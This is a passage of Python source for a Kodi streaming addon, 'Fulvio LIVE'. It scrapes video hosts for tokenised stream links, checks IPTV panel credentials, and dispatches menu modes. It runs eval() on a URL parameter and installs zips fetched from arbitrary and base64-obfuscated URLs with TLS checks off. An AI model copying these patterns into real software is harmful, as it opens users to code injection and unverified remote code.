        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))

        liz.addContextMenuItems(contextMenu, replaceItems=True)
        if not playlist is None:
            if addon.getSetting('add_playlist') == "false":
                playlist_name = name.split(') ')[1]
                contextMenu_ = [
                    ('Play '+playlist_name+' PlayList','XBMC.RunPlugin(%s?mode=13&name=%s&playlist=%s)'
                     %(sys.argv[0], urllib.quote_plus(playlist_name), urllib.quote_plus(str(playlist).replace(',','||'))))
                     ]
                liz.addContextMenuItems(contextMenu_)
        #print 'adding',name
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,totalItems=total,isFolder=isFolder)

        #print 'added',name
        return ok

def playsetresolved(url,name,iconimage,setresolved=True,reg=None):
    print url
    if setresolved:
        setres=True
        if '$$LSDirect$$' in url:
            url=url.replace('$$LSDirect$$','')
            setres=False
        if reg and 'notplayable' in reg:
            setres=False

        liz = xbmcgui.ListItem(name, iconImage=iconimage)
        liz.setInfo(type='Video', infoLabels={'Title':name})
        liz.setProperty("IsPlayable","true")
        liz.setPath(url)
        if not setres:
            xbmc.Player().play(url)
        else:
            xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, liz)
           
    else:
        xbmc.executebuiltin('XBMC.RunPlugin('+url+')')

## Thanks to daschacka, an epg scraper for http://i.teleboy.ch/programm/station_select.php
##  http://forum.xbmc.org/post.php?p=936228&postcount=1076
def getepg(link):
        url=urllib.urlopen(link)
        source=url.read()
        url.close()
        source2 = source.split("Jetzt")
        source3 = source2[1].split('programm/detail.php?const_id=')
        sourceuhrzeit = source3[1].split('<br /><a href="/')
        nowtime = sourceuhrzeit[0][40:len(sourceuhrzeit[0])]
        sourcetitle = source3[2].split("</a></p></div>")
        nowtitle = sourcetitle[0][17:len(sourcetitle[0])]
        nowtitle = nowtitle.encode('utf-8')
        return "  - "+nowtitle+" - "+nowtime

def get_epg(url, regex):
        data = makeRequest(url)
        try:
            item = re.findall(regex, data)[0]
            return item
        except:
            addon_log('regex failed')
            addon_log(regex)
            return

def installAddon(url):
    addonname = url.split('/')[-1].split('-')[0]
    xbmc.log('QUI NOME ADDON addoname: '+addonname)
    extpath = os.path.join(xbmc.translatePath("special://home/addons/").decode("utf-8")) 
    addonsDir = xbmc.translatePath(os.path.join('special://home', 'userdata')).decode("utf-8")
    packageFile = os.path.join(addonsDir, 'package.zip')
    UPDATE_URL = url
    xbmc.log('START DOWNLOAD UPDATE:' + UPDATE_URL)
    DownloaderClass(UPDATE_URL,packageFile)  
    import ziptools
    unzipper = ziptools.ziptools()
    unzipper.extract(packageFile,extpath)
    addenable.set_enabled(addonname)
    try:
        depends=xbmc.translatePath(os.path.join('special://home','addons',addonname,'addon.xml'));
        source=open(depends,mode='r'); 
        link=source.read(); 
        source.close();
        dmatch=re.compile('import addon="(.+?)"').findall(link)
        for requires in dmatch:
            if not 'xbmc.python' in requires:
                print 'Requires --- '+requires; 
                dependspath=xbmc.translatePath(os.path.join('special://home/addons',requires));
                print dependspath
                if not os.path.exists(dependspath): 
                    DEPENDINSTALL(requires,'http://indigo.tvaddons.ag/installer/dependencies/'+requires+'.zip','','addon','none')
    except: traceback.print_exc(file=sys.stdout)

    xbmc.executebuiltin("UpdateLocalAddons")
    xbmcgui.Dialog().ok('Fulvio LIVE', 'Installazione completata.', '')
    if os.remove( packageFile ): 
        xbmc.log('TEMPORARY ZIP REMOVED')
    
def DEPENDINSTALL(name,url,description,filetype,repourl):
    #Split Script Depends============================
    files=url.split('/'); 
    dependname=files[-1:]; 
    dependname=str(dependname);
    dependname=dependname.replace('[','').replace(']','').replace('"','').replace('[','').replace("'",'').replace(".zip",'');
    #StoprSplit======================================
    path=xbmc.translatePath(os.path.join('special://home','addons','packages')); 
    dp=xbmcgui.DialogProgress();
    dp.create("Configuring Requirements:","Downloading and ",'','Installing '+name);
    lib=os.path.join(path,name+'.zip');
    try: 
        os.remove(lib)
    except: 
        pass
    DownloaderClass(url,lib)  
    if filetype=='addon': 
        addonfolder=xbmc.translatePath(os.path.join('special://','home','addons'))
    time.sleep(2)
    import ziptools
    unzipper = ziptools.ziptools()
    unzipper.extract(lib,addonfolder)
    addenable.set_enabled(dependname)
    #Start Script Depend Search==================================================================
    depends=xbmc.translatePath(os.path.join('special://home','addons',dependname,'addon.xml'));
    source=open(depends,mode='r'); 
    link=source.read(); 
    source.close();

    dmatch=re.compile('import addon="(.+?)"').findall(link)
    for requires in dmatch:
        if not 'xbmc.python' in requires:
            #kodi.log('Script Requires --- '+requires)
            dependspath=xbmc.translatePath(os.path.join('special://home','addons',requires))
            if not os.path.exists(dependspath): 
                DEPENDINSTALL(requires,'http://indigo.tvaddons.ag/installer/dependencies/'+requires+'.zip','','addon','none')
            xbmc.executebuiltin("XBMC.UpdateLocalAddons()")
    #End Script Depend Search======================================================================

def addplayerCore():
    url = base64.decodestring('aHR0cHM6Ly9naXRodWIuY29tL3JhbXMzcmxlci9wREhPMHloUHFpejVSVDZpTm9mYy9yYXcvbWFzdGVyL3BsYXllcmNvcmVmYWN0b3J5LnppcA==')
    addonsDir = xbmc.translatePath(os.path.join('special://home', 'userdata')).decode("utf-8")
    packageFile = os.path.join(addonsDir, 'playercorefactory.zip')
    urllib.urlretrieve(url, packageFile)
    ExtractAll(packageFile, addonsDir)
    try:
        os.remove(packageFile)
    except:
        pass

def rmplayerCore():
    dir=xbmc.translatePath('special://home/userdata')
    file=os.path.join(dir, 'playercorefactory.xml')
    xbmcvfs.delete(file)

def rmtree(top):
    for root, dirs, files in os.walk(top, topdown=False):
        for name in files:
            if name != 'commoncache.db':
                filename = os.path.join(root, name)
                os.chmod(filename, stat.S_IWUSR)
                os.remove(filename)
            else:
                continue
        for name in dirs:
            os.rmdir(os.path.join(root, name))
    # os.rmdir(top) 

def Cacheclean():
    cdir = os.path.join(xbmc.translatePath("special://temp"))
    if os.path.exists(cdir):
        # shutil.rmtree(cdir)
        rmtree(cdir)
        xbmc.executebuiltin("XBMC.Notification(Fulvio LIVE,Cache cancellata!,2500,"+icon+")")

def update():
    xbmc.executebuiltin("XBMC.Container.Refresh")
    xbmc.executebuiltin("XBMC.Container.Update")

def check_url(url):
    import urlparse
    parts = urlparse.urlsplit(url)
    if not parts.scheme or not parts.netloc:
        return False
    else:
        return True

def cachepage( url, s):
    import time, requests
    t = 0
    content = ""
    cdir = os.path.join(xbmc.translatePath("special://temp"),"files")
    if not os.path.exists(cdir):
        os.makedirs(cdir)
    TempName = base64.urlsafe_b64encode(url)
    tmp = os.path.join(cdir, TempName)
    if os.path.isfile(tmp):
        t = time.time() - os.path.getmtime(tmp)
    if t > s or not os.path.isfile(tmp):
        hdrs = {'Referer':'', 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36'}
        content = requests.get(url, headers=hdrs, verify=False).text.encode("utf8")
        # content = content.replace("   "," ").replace("  "," ").replace("  "," ").replace("\t"," ")
        content = base64.urlsafe_b64encode(content)
        if len(content) > 0 :
            write_file(tmp, content)
            xbmc.sleep(300)
    else:
        content = ReadFile(tmp)
    return content

def cachepage2( url, s):
    import time, requests
    t = 0
    content = ""
    cdir = os.path.join(xbmc.translatePath("special://temp"),"files")
    if not os.path.exists(cdir):
        os.makedirs(cdir)
    TempName = base64.urlsafe_b64encode(url)
    tmp = os.path.join(cdir, TempName)
    if os.path.isfile(tmp):
        t = time.time() - os.path.getmtime(tmp)
    if t > s or not os.path.isfile(tmp):
        hdrs = {'Referer':'', 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36'}
        content = requests.get(url, headers=hdrs, verify=False, timeout=10).text.encode("utf8")
        if len(content) > 0 :
            write_file(tmp, content)
            xbmc.sleep(300)
    else:
        content = ReadFile(tmp)
    return content

def Ustreamix(u):
    h = requests.get(u, headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'}, verify=False).text
    
    first_ip = re.findall("x_first_ip.+?'(.*?)'", h)[0]
    first_c = re.findall("x_first_c.+?'(.*?)'", h)[0]
    ket2 = re.findall("ket2.+?'(.*?)'", h)[0]
    first_ua = re.findall("x_first_ua.+?'(.*?)'", h)[0]

    preurl = 'https://tmg.ustreamix.com/'
    url = preurl + 'stats.php?p=' + first_ip + '&C=' + first_c + '&Ket=' + ket2
    source = requests.get(url, headers = {'Referer': u, 'User-Agent': first_ua, 'Accept': '*/*'}).text
    tok = re.findall('var jdtk="(.*?)"', source)[0]
    ch=u.split('/')[-1]
    reff = '|User-Agent=iPad'
    return preurl + 'tmg.m3u8?stream=' + ch + '&token=' + tok + reff

    # random = re.findall(r"String\.fromCharCode\(parseInt\(atob\(value\)\.replace\(\/\\D\/g,''\)\) - (\d{3})\);",h)[0]
    # mm = re.findall(r'"([a-zA-Z0-9]{12})",',h)
    # html = ""
    # for m in mm:
        # m = base64.b64decode(m)
        # m = re.search('[a-zA-Z]{3}(\d{3})[a-zA-Z]{3}',m).group(1)
        # m = int(m) - int(random)
        # m = chr(m)
        # html += str(m)
    # xbmc.log('HTML content:  \n'+html)
    # tokurl = re.search(r'<script type="text/javascript" src="//(j.hulkfiles.com/stats.php[^"]+)">',html).group(1)
    # tokpag = requests.get('http://'+tokurl, headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'}, verify=False).text
    # token = re.search(r'var jdtk="([^"]+)"',tokpag).group(1)
    # streamu = re.search(r"var stream = '(https://j.hulkfiles.com[^']+)'",html).group(1).replace('https','http')
    # xbmc.log('STREAM HTTP   '+streamu)
    # stream = streamu + token
    # m3u8 = requests.get(stream, headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'}).text
    # xbmc.log('m3u8 HTTP   '+m3u8)
    # reff = '|User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0&Referer=https://beta.ustreamix.com/stream.php?id=premium-sport-1-italia&Origin=https://beta.ustreamix.com&Connection=keep-alive$Accept-Encoding=gzip, deflate, br'
    # return stream#+reff

        # ct = ''+str(i1)+''
        # iv = ''+str(i2)+''
        # s = ''+str(i3)+''
        # passphrase = ''+str(i4)+''
    # ct = base64.b64decode(ct)
    # iv = iv.decode('hex','strict')
    # salt = s.decode('hex','strict')
    # concatedPassphrase = passphrase + salt
    # md5 = []
    # import hashlib
    # hashed = hashlib.md5(concatedPassphrase).digest()
    # md5.append(hashed)
    # result = md5[0]
    # c = 1
    # if c < 3:
        # hashed = hashlib.md5(md5[c-1]+concatedPassphrase).digest()
        # md5.append(hashed)
        # result += md5[c]
        # c += 1
    # key = result[0:32]
    # import pyaes
    # decryptor = pyaes.new(key , pyaes.MODE_CBC, IV=iv)
    # decrypted=decryptor.decrypt(ct).split('\0')[0].replace('\/','/').replace('"','')
    # decrypted=re.findall('(http.+?token=[0-9a-zA-Z]+)',decrypted)[0]
    # su = '|User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&Referer=&Accept-Encoding=gzip, deflate, sdch, br&Accept-Language=it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4'
    # return decrypted+su

def lisreq(data):
    i=[
    ['B','a'],\
    ['g','D'],\
    ['r','h'],\
    ['W','S'],\
    ['m','L'],\
    ['A','w'],\
    ['p','N'],\
    ['E','q'],\
    ['t','U'],\
    ['n','T'],\
    ]
    return i

##not a generic implemenation as it needs to convert            
def d2x(d, root="root",nested=0):

    op = lambda tag: '<' + tag + '>'
    cl = lambda tag: '</' + tag + '>\n'

    ml = lambda v,xml: xml + op(key) + str(v) + cl(key)
    xml = op(root) + '\n' if root else ""

    for key,vl in d.iteritems():
        vtype = type(vl)
        if nested==0: key='regex' #enforcing all top level tags to be named as regex
        if vtype is list: 
            for v in vl:
                v=escape(v)
                xml = ml(v,xml)         
        
        if vtype is dict: 
            xml = ml('\n' + d2x(vl,None,nested+1),xml)         
        if vtype is not list and vtype is not dict: 
            if not vl is None: vl=escape(vl)
            #print repr(vl)
            if vl is None:
                xml = ml(vl,xml)
            else:
                #xml = ml(escape(vl.encode("utf-8")),xml)
                xml = ml(vl.encode("utf-8"),xml)

    xml += cl(root) if root else ""

    return xml
xbmcplugin.setContent(int(sys.argv[1]), 'movies')

def checklist(url):
    import requests, re
    url=urllib.unquote_plus(url)
    if url.find("get.php?username=")>0 or re.search("http://(.+?)/live/(.+?)/(.+?)/.+?\..+",url) or re.search("http://(.+?)/movie/(.+?)/(.+?)/.+?\..+",url):
        ch = re.search("http://(.+?)/.+?username=(.+?)&password=(.+?)&type",url)
        if not ch:
            ch = re.search("http://(.+?)/live/(.+?)/(.+?)/.+?\.ts",url)
            if not ch:
                ch = re.search("http://(.+?)/live/(.+?)/(.+?)/.+?\.m3u8",url)
                if not ch:
                    ch = re.search("http://(.+?)/movie/(.+?)/(.+?)/.+?\.mkv",url)
                    if not ch:
                        ch = re.search("http://(.+?)/movie/(.+?)/(.+?)/.+?\.mp4",url)

    else:
        hdrs = {'Referer':'', 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36'}
        html = requests.get(url, headers=hdrs, verify=False, timeout=10).text
        ch = re.search("http://(.+?)/live/(.+?)/(.+?)/.+?\.ts",html)
        if not ch:
            ch = re.search("http://(.+?)/live/(.+?)/(.+?)/.+?\.m3u8",html)
            if not ch:
                ch = re.search("http://(.+?)/movie/(.+?)/(.+?)/.+?\.mkv",html)
                if not ch:
                    ch = re.search("http://(.+?)/movie/(.+?)/(.+?)/.+?\.mp4",html)

    panel = 'http://'+ch.group(1)+'/panel_api.php?username='+ch.group(2)+'&password='+ch.group(3)
    matches2 = []
    hdrs = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36'}
    html = requests.get(panel, headers=hdrs, verify=False, timeout=10).text

    # html = ''
    # r = requests.get(panel, headers=hdrs, verify=False, stream=True)
    # for chunk in r.iter_content(chunk_size=190):
        # if chunk:
            # html = ''.join(chunk)
            # break
    status = ''
    expdata = ''
    test = ''
    conns = ''
    creatdata = ''
    maxuser = ''
    match = re.findall(r'{"user_info":{.*?auth":1', html)
    if not match:
        status = 'Nessuna informazione'
    matches2 += status

    match = re.findall(r',"(status":".+?)","exp_date":["]*.+?["]*,"is_trial":".+?","active_cons":".+?","created_at":".+?","max_connections":".+?",', html)
    for n,i in enumerate(match):
        if i == 'status":"Active':
            status = 'Stato: [COLOR lime]ATTIVA[/COLOR]'
        if i == 'status":"Expired':
            status = 'Stato: [COLOR red]SCADUTA[/COLOR]'
        if i == 'status":"Disabled':
            status = 'Stato: [COLOR red]DISABILITATA[/COLOR]'
        if i == 'status":"Banned':
            status = 'Stato: [COLOR red]BANNATA[/COLOR]'
    matches2 += match

    import time
    import datetime
    match = re.findall(r',"status":".+?","exp_date":["]*(.+?)["]*,"is_trial":".+?","active_cons":".+?","created_at":".+?","max_connections":".+?",', html)
    for n,i in enumerate(match):
        if not i == 'null':
            currentdate = time.time()
            expirestamp = int(match[0])
            expiredate = datetime.datetime.fromtimestamp(int(match[0])).strftime('%d-%m-%Y %H:%M:%S')
            if expirestamp > currentdate:
                expdata = 'Data scadenza: [COLOR lime]'+expiredate+'[/COLOR]'
            elif expirestamp < currentdate:
                expdata = 'Data scadenza: [COLOR red]'+expiredate+'[/COLOR]'
        if i == 'null':
            expdata = 'Data scadenza: [COLOR orange]NULL[/COLOR]'
    matches2 += match

    match = re.findall(r',"status":".+?","exp_date":["]*.+?["]*,"is_trial":"(.+?)","active_cons":".+?","created_at":".+?","max_connections":".+?",', html)
    for n,i in enumerate(match):
        if i == '1':
            test = 'Test: [COLOR yellow]SI[/COLOR]'
        if i == '0':
            test = 'Test: [COLOR white]NO[/COLOR]'
    matches2 += match

    match = re.findall(r',"status":".+?","exp_date":["]*.+?["]*,"is_trial":".+?","active_cons":"(.+?)","created_at":".+?","max_connections":".+?",', html)
    for n,i in enumerate(match):
        if i :
            conns = 'Utenti connessi: [COLOR hotpink]'+match[0]+'[/COLOR]'
    matches2 += match

    match = re.findall(r',"status":".+?","exp_date":["]*.+?["]*,"is_trial":".+?","active_cons":".+?","created_at":"(.+?)","max_connections":".+?",', html)
    for n,i in enumerate(match):
        if i :
            creatdata = 'Data creazione: [COLOR white]'+datetime.datetime.fromtimestamp(int(match[0])).strftime('%d-%m-%Y %H:%M:%S')+'[/COLOR]'
    matches2 += match

    match = re.findall(r',"status":".+?","exp_date":["]*.+?["]*,"is_trial":".+?","active_cons":".+?","created_at":".+?","max_connections":"(.+?)",', html)
    for n,i in enumerate(match):
        if i :
            maxuser = 'Max utenti permessi: [COLOR hotpink]'+match[0]+'[/COLOR]'
    matches2 += match
    if matches2:
        line = "[COLOR skyblue]"+ status +"        "+ test + "\n" + expdata +"     "+ conns +"\n" + creatdata +"  "+ maxuser + "[/COLOR]"
        dialog = xbmcgui.Dialog()
        dialog.ok('Fulvio LIVE: Check List', line, '', '')
    
def url_to_SOD(url,name,server,action='play'):
    name = BBTagRemove(name)
    try:
        if type(url)== str:
            url = unicode(url,"utf8", "ignore").encode("utf8")
        else:
            url = url.encode("utf8")
    
        if type(name)== str:
            name = unicode(name,"utf8", "ignore").encode("utf8")
        else:
            name = name.encode("utf8")
    except:
        pass
    query =  '{"subtitle": "", "contentSeason": "", "extra": "", "duration": 0, "contentSerieName": "", "fulltitle": "' +name+'", "hasContentDetails": "false", "category": "", "contentEpisodeNumber": "", "title":"' +name+ '", "fanart": "/home/vania/.kodi/addons/plugin.video.kodilivetv/fanart.jpg", "show": "", "contentChannel": "list", "folder": false, "type": "", "thumbnail": "", "channel": "seriehd", "contentType": "", "contentEpisodeTitle": "", "plot": "", "contentTitle": "", "viewmode": "list", "password": "", "contentPlot": "", "language": "", "url": "' +url+ '", "contentThumbnail": "", "server": "' + server +'", "context": "", "action": "' +action+ '"}'
    query = urllib.quote(base64.b64encode(query))
    urltos = "plugin://plugin.video.streamondemand/?" + query
    return urltos

def BBTagRemove(string):
    string = re.sub(r"\[/COLOR]|\[COLOR.*?]","",string)
    string = re.sub(r"\[/B]|\[B]","",string)
    string = re.sub(r"\[/I]|\[I]","",string)
    string = re.sub(r"\[/UPPERCASE]|\[UPPERCASE]","",string)
    string = re.sub(r"\[/LOWERCASE]|\[LOWERCASE]","",string)
    string = re.sub(r"\[/LIGHT]|\[LIGHT]","",string)
    string = re.sub(r"\[/CAPITALIZE]|\[CAPITALIZE]","",string)
    return string

def nbamodded(url):
    addonsDir = xbmc.translatePath(os.path.join('special://home', 'addons')).decode("utf-8")
    packageFile = os.path.join(addonsDir, 'packages', 'package.zip')
    urllib.urlretrieve(url, packageFile)
    ExtractAll(packageFile, addonsDir)
    try:
        os.remove(packageFile)
    except:
        pass
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    xbmcgui.Dialog().ok('Fulvio LIVE', 'Addon modded by Luciano:','[COLOR lime]plugin.video.prosport-0.83[/COLOR]','Installazione completata')

def Xvideos(url):
    import requests
    hdrs = {'Referer':'', 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36'}
    html = requests.get(url, headers=hdrs, verify=False).text
    geturl = re.findall(r'(http[\S]+?\.flv[^&\s]+)', html)[0]
    head_ua = 'User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36'
    head_ae = 'Accept-Encoding=gzip, deflate'
    head_ref = 'Referer=' + url
    return urllib.unquote_plus(geturl + '|' + head_ua + '&' + head_ref + '&' + head_ae) 

def Fastvideo(url):
    import requests, re
    result = re.search('(http.+?\/\/.+?fastvideo.+?\/)(\S+)',url)
    if result:
        url2 = result.group(1)+'embed-'+result.group(2)
    hdrs = {'Referer':'', 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36'}
    html = requests.get(url2, headers=hdrs, verify=False).text
    getEnc = re.findall(r'(eval.*)', html)[0]
    getunpacked = get_unpacked(getEnc,'(eval\(function\(p,a,c,k,e,d.*)' )
    geturl = re.findall(r'"(http.*?)"', getunpacked)[0]
    head_ua = 'User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36'
    head_ae = 'Accept-Encoding=gzip, deflate'
    head_ref = 'Referer=' + url
    return urllib.unquote_plus(geturl + '|' + head_ua + '&' + head_ref + '&' + head_ae) 

try:
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_UNSORTED)
except:
    pass
try:
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_LABEL)
except:
    pass
try:
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_DATE)
except:
    pass
try:
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_GENRE)
except:
    pass

params=get_params()

url=None
name=None
mode=None
playlist=None
iconimage=None
fanart=FANART
playlist=None
fav_mode=None
regexs=None

try:
    url=urllib.unquote_plus(params["url"]).decode('utf-8')
except:
    pass
try:
    name=urllib.unquote_plus(params["name"])
except:
    pass
try:
    iconimage=urllib.unquote_plus(params["iconimage"])
except:
    pass
try:
    fanart=urllib.unquote_plus(params["fanart"])
except:
    pass
try:
    mode=int(params["mode"])
except:
    pass
try:
    playlist=eval(urllib.unquote_plus(params["playlist"]).replace('||',','))
except:
    pass
try:
    fav_mode=int(params["fav_mode"])
except:
    pass
try:
    regexs=params["regexs"]
except:
    pass
playitem=''
try:
    playitem=urllib.unquote_plus(params["playitem"])
except:
    pass
    
addon_log("Mode: "+str(mode))

if not url is None:
    addon_log("URL: "+str(url.encode('utf-8')))
addon_log("Name: "+str(name))

if not playitem =='':
    s=getSoup('',data=playitem)
    name,url,regexs=getItems(s,None,dontLink=True)
    mode=117

if mode==None:
    addon_log("getSources")
    init_al()
    getSources()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==500:
    addon_log("getList")
    getList()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==501:
    addon_log("rmlogin")
    rmlogin(url)

elif mode==502:
    addon_log("getExtsource")
    a=argHome()
    getExtsource(a)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==503:
    addon_log("getWatchapp")
    a=argHome()
    getWatchapp(a)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==504:
    addon_log("searchWatchapp")
    searchWatchapp()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==505:
    addon_log("getUrhd")
    getUrhd()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==506:
    addon_log("getUrhd2")
    name=re.search('\&name=(.+)',url).group(1)
    url=url.replace('&name='+name,'')
    name=name.encode('utf-8')
    name=name.replace('&name=','')
    link = getUrhd2(url)
    xbmc.sleep(100)
    select = Getdialogselect('Seleziona il player',['[COLOR white]Normal[/COLOR]','[COLOR cyan]HLS[/COLOR]','[COLOR hotpink]HLSRETRY[/COLOR]'])
    xbmc.sleep(150)
    if select == -1:
        pass
    if select == 0:
        playsetresolved(link,name,iconimage)
    if select == 1:
        url1 = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(link)+'&amp;streamtype=HLS&name='+urllib.quote(name)+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
        xbmc.sleep(350)
        xbmc.executebuiltin('XBMC.RunPlugin('+url1+')')
    if select == 2:
        url1 = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(link)+'&amp;streamtype=HLS&name='+urllib.quote(name)+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
        xbmc.sleep(350)
        xbmc.executebuiltin('XBMC.RunPlugin('+url1+')')

elif mode==507:
    addon_log("cacheUrhd")
    cacheUrhd()

elif mode==508:
    addon_log("calcioStream")
    calcioStream()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==509:
    addon_log("iptvSatindex")
    iptvSatindex()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==510:
    addon_log("iptvSatmain")
    iptvSatmain(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==511:
    addon_log("iptvSatpage")
    iptvSatpage(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==512:
    addon_log("iptvSatiptv")
    iptvSatiptv(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==513:
    addon_log("sportcalcioPlaylist")
    sportcalcioPlaylist()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==514:
    addon_log("saferSurf")
    saferSurf()

elif mode==515:
    addon_log("addplayerCore")
    addplayerCore()
    # update()

elif mode==516:
    addon_log("rmplayerCore")
    rmplayerCore()
    # update()

elif mode==517:
    addon_log("getAddonlist")
    getAddonlist()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==518:
    addon_log("installAddon")
    installAddon(url)

elif mode==519:
    addon_log("getF4mproxy")
    getF4mproxy()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==520:
    addon_log("getF4mtester")
    getF4mtester()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==521:
    addon_log("getSportsdevil")
    getSportsdevil()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==522:
    addon_log("getCricfree")
    getCricfree()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==523:
    addon_log("getCloudtv")
    getCloudtv()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==524:
    addon_log("getKoratv")
    getKoratv()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==525:
    addon_log("getHdlive")
    getHdlive()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==526:
    addon_log("getHdlive2")
    getHdlive2(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==527:
    addon_log("getHdlive3")
    getHdlive3(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==528:
    addon_log("getAndroidtv")
    getAndroidtv()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

# elif mode==529:
    # addon_log("getAndroidtv2")
    # getAndroidtv2(url)
    # xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==530:
    addon_log("getStreamondemand")
    getStreamondemand()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==531:
    addon_log("getExodus")
    getExodus()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==532:
    addon_log("getEritrolist")
    getEritrolist()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==533:
    addon_log("searchEritrolist")
    searchEritrolist()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==534:
    addon_log("getStreamhunt")
    getStreamhunt(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==535:
    addon_log("searchStreamhunt")
    searchStreamhunt()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==536:
    addon_log("List1")
    List1(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==537:
    addon_log("getPlexus")
    getPlexus()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==538:
    addon_log("getOpensub")
    getOpensub()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==539:
    addon_log("getTvonline")
    getTvonline()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==540:
    addon_log("getOpus")
    getOpus(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==541:
    addon_log("getOpus2")
    getOpus2(url)

elif mode==542:
    addon_log("getDreamworld")
    getDreamworld()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==543:
